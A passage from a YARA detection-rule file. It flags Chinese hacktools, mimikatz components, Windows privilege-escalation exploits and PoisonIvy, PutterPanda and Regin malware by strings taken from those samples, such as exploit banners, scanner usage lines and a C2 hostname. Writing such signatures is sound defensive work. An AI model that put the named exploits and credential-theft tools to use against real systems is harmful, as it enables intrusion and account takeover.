      $s1 = "c:\\windows\\system32\\command.com /c " fullword ascii
      $s2 = "Easy Usage Version -- Edited By: racle@tian6.com" fullword ascii
      $s3 = "OH,Sry.Too long command." fullword ascii
      $s4 = "Success! Commander." fullword ascii
      $s5 = "Hey,how can racle work without ur command ?" fullword ascii
      $s6 = "The exploit thread was unable to map the virtual 8086 address space" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them
} 

rule CN_Tools_Vscan_RID2C6C : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Vscan.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:48:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[+] Usage: VNC_bypauth <target> <scantype> <option>" fullword ascii
      $s2 = "========RealVNC <= 4.1.1 Bypass Authentication Scanner=======" fullword ascii
      $s3 = "[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations" fullword ascii
      $s4 = "VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,..." fullword ascii
      $s5 = "-vn:%-15s:%-7d  connection closed" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 2 of them
} 

rule Dos_iis_RID29DB : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file iis.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 01:50:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "comspec" fullword ascii
      $s2 = "program terming" fullword ascii
      $s3 = "WinSta0\\Defau" fullword ascii
      $s4 = "* FROM IIsWebInfo" ascii
      $s5 = "www.icehack." ascii
      $s6 = "wmiprvse.exe" fullword ascii
      $s7 = "Pid: %d" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them
} 

rule HKTL_Unkown_CN_Generate_RID2F9F : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Generate.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 12:05:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\TEMP\\" fullword ascii
      $s2 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
      $s3 = "$530 Please login with USER and PASS." fullword ascii
      $s4 = "_Shell.exe" fullword ascii
      $s5 = "ftpcWaitingPassword" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 3 of them
} 

rule Pc_rejoice_RID2B04 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file rejoice.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:48:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "@members.3322.net/dyndns/update?system=dyndns&hostname=" fullword ascii
      $s2 = "http://www.xxx.com/xxx.exe" fullword ascii
      $s3 = "@ddns.oray.com/ph/update?hostname=" fullword ascii
      $s4 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
      $s5 = "ListViewProcessListColumnClick!" fullword ascii
      $s6 = "http://iframe.ip138.com/ic.asp" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 3 of them
} 

rule ms11080_withcmd_RID2C3A : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file ms11080_withcmd_RID2C3A.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:40:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage : ms11-080.exe cmd.exe Command " fullword ascii
      $s2 = "\\ms11080\\ms11080\\Debug\\ms11080.pdb" fullword ascii
      $s3 = "[>] by:Mer4en7y@90sec.org" fullword ascii
      $s4 = "[>] create porcess error" fullword ascii
      $s5 = "[>] ms11-080 Exploit" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them
} 

rule OtherTools_xiaoa_RID2D95 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file xiaoa.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:38:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage:system_exp.exe \"cmd\"" fullword ascii
      $s2 = "The shell \"cmd\" success!" fullword ascii
      $s3 = "Not Windows NT family OS." fullword ascii
      $s4 = "Unable to get kernel base address." fullword ascii
      $s5 = "run \"%s\" failed,code: %d" fullword ascii
      $s6 = "Windows Kernel Local Privilege Exploit " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them
} 

rule unknown2_RID2A53 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file unknown2_RID2A53.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 05:10:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://md5.com.cn/index.php/md5reverse/index/md/" fullword wide
      $s2 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
      $s3 = "http://www.md5.com.cn" fullword wide
      $s4 = "1.5.exe" fullword wide
      $s5 = "\\Set.ini" fullword wide
      $s6 = "OpenFileDialog1" fullword wide
      $s7 = " (*.txt)|*.txt" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 4 of them
} 

rule hydra_7_3_hydra_RID2CC8 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file hydra.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:03:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[ATTEMPT-ERROR] target %s - login \"%s\" - pass \"%s\" - child %d - %lu of %lu" fullword ascii
      $s2 = "(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE" ascii
      $s3 = "cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com" fullword ascii
      $s4 = "[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD" fullword ascii
      $s5 = "hydra -P pass.txt target cisco-enable  (direct console access)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them
} 

rule OracleScan_RID2AEC : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file OracleScan_RID2AEC.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:25:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "MYBLOG:HTTP://HI.BAIDU.COM/0X24Q" fullword ascii
      $s2 = "\\Borland\\Delphi\\RTL" fullword ascii
      $s3 = "USER_NAME" ascii
      $s4 = "FROMWWHERE" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule SQLTools_RID2A12 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file SQLTools_RID2A12.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 03:21:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "DBN_POST" fullword wide
      $s2 = "LOADER ERROR" fullword ascii
      $s3 = "www.1285.net" fullword wide
      $s4 = "TUPFILEFORM" fullword wide
      $s5 = "DBN_DELETE" fullword wide
      $s6 = "DBINSERT" fullword wide
      $s7 = "Copyright (C) Kibosoft Corp. 2001-2006" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2350KB and all of them
} 

rule portscanner_RID2BC0 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file portscanner_RID2BC0.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:19:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "PortListfNo" fullword ascii
      $s1 = ".533.net" fullword ascii
      $s2 = "CRTDLL.DLL" fullword ascii
      $s3 = "exitfc" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them
} 

rule kappfree_RID2A5F : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file kappfree_RID2A5F.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 05:30:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Bienvenue dans un processus distant" fullword wide
      $s2 = "kappfree_RID2A5F.dll" fullword ascii
      $s3 = "kappfree_RID2A5F de mimikatz pour Windows (anti AppLocker)" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule Smartniff_RID2ABB : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Smartniff_RID2ABB.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:03:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "smsniff.exe" fullword wide
      $s2 = "support@nirsoft.net0" fullword ascii
      $s3 = "</requestedPrivileges></security></trustInfo></assembly>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule ChinaChopper_caidao_RID2E85 : DEMO EXE FILE HKTL T1100 T1136 {
   meta:
      description = "Chinese Hacktool Set - file caidao.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:18:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1100, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Pass,Config,n{)" fullword ascii
      $s2 = "phMYSQLZ" fullword ascii
      $s3 = "\\DHLP\\." fullword ascii
      $s4 = "\\dhlp\\." fullword ascii
      $s5 = "SHAutoComple" fullword ascii
      $s6 = "MainFrame" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1077KB and all of them
} 

rule KiwiTaskmgr_2_RID2C0F : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file KiwiTaskmgr.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:33:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Process Ok, Memory Ok, resuming process :)" fullword wide
      $s2 = "Kiwi Taskmgr no-gpo" fullword wide
      $s3 = "KiwiAndTaskMgr" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule kappfree_2_RID2AF0 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file kappfree.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "kappfree.dll" fullword ascii
      $s2 = "kappfree de mimikatz pour Windows (anti AppLocker)" fullword wide
      $s3 = "' introuvable !" fullword wide
      $s4 = "kiwi\\mimikatz" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them
} 

rule x_way2_5_sqlcmd_RID2CE2 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file sqlcmd.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:08:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "LOADER ERROR" fullword ascii
      $s2 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
      $s3 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
      $s4 = "kernel32.dll" fullword ascii
      $s5 = "VirtualAlloc" fullword ascii
      $s6 = "VirtualFree" fullword ascii
      $s7 = "VirtualProtect" fullword ascii
      $s8 = "ExitProcess" fullword ascii
      $s9 = "user32.dll" fullword ascii
      $s10 = "MessageBoxA" fullword ascii
      $s12 = "wsprintfA" fullword ascii
      $s13 = "kernel32.dll" fullword ascii
      $s14 = "GetProcAddress" fullword ascii
      $s15 = "GetModuleHandleA" fullword ascii
      $s16 = "LoadLibraryA" fullword ascii
      $s17 = "odbc32.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them
} 

rule Win32_klock_RID2B17 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file klock.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:51:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "klock.dll" fullword ascii
      $s2 = "Erreur : impossible de basculer le bureau ; SwitchDesktop : " fullword wide
      $s3 = "klock de mimikatz pour Windows" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them
} 

rule ipsearcher_RID2B37 : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "Chinese Hacktool Set - file ipsearcher_RID2B37.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:57:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://www.wzpg.com" fullword ascii
      $s1 = "ipsearcher_RID2B37\\ipsearcher_RID2B37\\Release\\ipsearcher_RID2B37.pdb" fullword ascii
      $s3 = "_GetAddress" fullword ascii
      $s5 = "ipsearcher_RID2B37.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 140KB and all of them
} 

rule ms10048_x64_RID2A2F : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file ms10048-x64.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 04:10:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "The target is most likely patched." fullword ascii
      $s2 = "Dojibiron by Ronald Huizer, (c) master#h4cker.us  " fullword ascii
      $s3 = "[ ] Creating evil window" fullword ascii
      $s4 = "[+] Set to %d exploit half succeeded" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 1 of them
} 

rule hscangui_RID2A63 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file hscangui_RID2A63.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 05:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[%s]: Found \"FTP account: anyone/anyone@any.net\"  !!!" fullword ascii
      $s2 = "http://www.cnhonker.com" fullword ascii
      $s3 = "%s@ftpscan#Cracked account:  %s/%s" fullword ascii
      $s4 = "[%s]: Found \"FTP account: %s/%s\" !!!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them
} 

rule GoodToolset_ms11080_RID2DBD : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file ms11080.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:44:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[*] command add user 90sec 90sec" fullword ascii
      $s2 = "\\ms11080\\Debug\\ms11080.pdb" fullword ascii
      $s3 = "[>] by:Mer4en7y@90sec.org" fullword ascii
      $s4 = "[*] Add to Administrators success" fullword ascii
      $s5 = "[*] User has been successfully added" fullword ascii
      $s6 = "[>] ms11-08 Exploit" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them
} 

rule epathobj_exp64_RID2C74 : DEMO EXE FILE HKTL T1068 T1136 {
   meta:
      description = "Chinese Hacktool Set - file epathobj_exp64_RID2C74.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:49:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1068, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Watchdog thread %d waiting on Mutex" fullword ascii
      $s2 = "Exploit ok run command" fullword ascii
      $s3 = "\\epathobj_exp\\x64\\Release\\epathobj_exp.pdb" fullword ascii
      $s4 = "Alllocated userspace PATHRECORD () %p" fullword ascii
      $s5 = "Mutex object did not timeout, list not patched" fullword ascii
      $s6 = "- inconsistent onexit begin-end variables" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them
} 

rule kelloworld_2_RID2BE1 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file kelloworld.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:25:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Hello World!" fullword wide
      $s2 = "kelloworld.dll" fullword ascii
      $s3 = "kelloworld de mimikatz pour Windows" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule HScan_v1_20_hscan_RID2D11 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file hscan.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:16:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[%s]: Found \"FTP account: anyone/anyone@any.net\"  !!!" fullword ascii
      $s2 = "%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100" fullword ascii
      $s3 = ".\\report\\%s-%s.html" fullword ascii
      $s4 = ".\\log\\Hscan.log" fullword ascii
      $s5 = "[%s]: Found cisco Enable password: %s !!!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them
} 

rule _Project1_Generate_rejoice_RID3142 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - from files Project1.exe, Generate.exe, rejoice.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:14:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sfUserAppDataRoaming" fullword ascii
      $s2 = "$TRzFrameControllerPropertyConnection" fullword ascii
      $s3 = "delphi32.exe" fullword ascii
      $s4 = "hkeyCurrentUser" fullword ascii
      $s5 = "%s is not a valid IP address." fullword wide
      $s6 = "Citadel hooking error" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule _hscan_hscan_hscangui_RID2F9A : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 12:04:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".\\log\\Hscan.log" fullword ascii
      $s2 = ".\\report\\%s-%s.html" fullword ascii
      $s3 = "[%s]: checking \"FTP account: ftp/ftp@ftp.net\" ..." fullword ascii
      $s4 = "[%s]: IPC NULL session connection success !!!" fullword ascii
      $s5 = "Scan %d targets,use %4.1f minutes" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and all of them
} 

rule Kiwi_Tools_Mimikatz_1_RID2F4A : DEMO EXE FILE HKTL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Chinese Hacktool Set - from mimikatz files"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:50:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "http://blog.gentilkiwi.com/mimikatz" ascii
      $s2 = "Benjamin Delpy" fullword ascii
      $s3 = "GlobalSign" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule Kiwi_Tools_Mimikatz_2_RID2F4B : DEMO EXE FILE HKTL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Chinese Hacktool Set - from mimikatz files"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "mimikatz" fullword wide
      $s2 = "Copyright (C) 2012 Gentil Kiwi" fullword wide
      $s3 = "Gentil Kiwi" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule MAL_Fidelis_Advisory_Purchase_Order_pps_RID3661 : DEMO MAL T1086 T1136 {
   meta:
      description = "Detects a string found in a malicious document named Purchase_Order.pps"
      author = "Florian Roth"
      reference = "http://goo.gl/ZjJyti"
      date = "2015-06-09 16:53:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Users\\Gozie\\Desktop\\Purchase-Order.gif" ascii
   condition: 
      all of them
} 

rule PoisonIvy_Sample_APT_3_RID2F58 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects a PoisonIvy Malware"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 11:53:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\notepad.exe" fullword ascii
      $s1 = "\\RasAuto.dll" fullword ascii
      $s3 = "winlogon.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
} 

rule PoisonIvy_Sample_APT_RID2EC6 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects a PoisonIvy APT malware group"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 11:28:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "pidll.dll" fullword ascii
      $s1 = "sens32.dll" fullword wide
      $s3 = "FileDescription" fullword wide
      $s4 = "OriginalFilename" fullword wide
      $s5 = "ZwSetInformationProcess" fullword ascii
      $s9 = "Microsoft Media Device Service Provider" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 47KB and all of them
} 

rule APT_Malware_PutterPanda_Rel_RID3167 : APT DEMO EXE FILE G0024 MAL T1136 {
   meta:
      description = "Detects an APT malware related to PutterPanda"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 13:21:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0024, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x0 = "app.stream-media.net" fullword ascii
      $x1 = "File %s does'nt exist or is forbidden to acess!" fullword ascii
      $s6 = "GetProcessAddresss of pHttpQueryInfoA Failed!" fullword ascii
      $s7 = "Connect %s error!" fullword ascii
      $s9 = "Download file %s successfully!" fullword ascii
      $s10 = "index.tmp" fullword ascii
      $s11 = "Execute PE Successfully" fullword ascii
      $s13 = "aa/22/success.xml" fullword ascii
      $s16 = "aa/22/index.asp" fullword ascii
      $s18 = "File %s a Non-Pe File" fullword ascii
      $s19 = "SendRequset error!" fullword ascii
      $s20 = "filelist[%d]=%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( 4 of ( $s* ) )
} 

rule Regin_Related_Malware_RID2F4E : APT DEMO MAL T1136 {
   meta:
      description = "Malware Sample - maybe Regin related"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 11:51:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%c%s%c -p %d -e %d -pv -c \"~~[%x] s; .%c%c%s %s /u %s_%d.dmp; q\"" fullword wide
      $s0 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\HotFix" fullword wide
      $s2 = "%x:%x:%x:%x:%x:%x:%x:%x%c" fullword ascii
      $s3 = "disp.dll" fullword ascii
      $s4 = "msvcrtd.dll" fullword ascii
      $s5 = "%d.%d.%d.%d%c" fullword ascii
      $s6 = "%ls_%08x" fullword wide
      $s8 = "d%ls%ls" fullword wide
      $s9 = "Memory location: 0x%p, size 0x%08x" fullword wide
   condition: 
      $s1 or 3 of ( $s* )
} 

rule PoisonIvy_Sample_APT_2_RID2F57 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects a PoisonIvy Malware"
      author = "Florian Roth"
      reference = "VT Analysis"
      date = "2015-06-03 11:53:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "pidll.dll" fullword ascii
      $s1 = "sens32.dll" fullword wide
      $s2 = "9.0.1.56" fullword wide
      $s3 = "FileDescription" fullword wide
      $s4 = "OriginalFilename" fullword wide
      $s5 = "ZwSetInformationProcess" fullword ascii
      $s6 = "\"%=%14=" fullword ascii
